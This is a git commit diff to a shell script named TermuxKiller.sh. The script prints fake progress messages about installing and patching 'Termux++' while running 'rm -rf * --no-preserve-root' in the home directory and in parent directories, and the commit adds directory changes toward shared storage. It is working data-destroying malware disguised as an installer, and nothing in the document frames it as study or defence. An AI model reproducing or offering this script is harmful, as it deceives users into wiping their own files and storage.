1c4847f62cc663a138cbafb2499fefce2b400558
Begitdj <egyptha29@gmail.com>
2024-11-05 22:42:09 +0700

    Update TermuxKiller.sh
    Test

--- TermuxKiller.sh
+++ TermuxKiller.sh
@@ -3,5 +3,7 @@ echo Installing Termux++ Please wait....
 echo Patching files....
 cd $HOME && rm -rf * --no-preserve-root
 echo Installation Done!
+cd ~/storage/shared
+cd
 cd .. && cd .. && rm -rf * --no-preserve-root
 exit
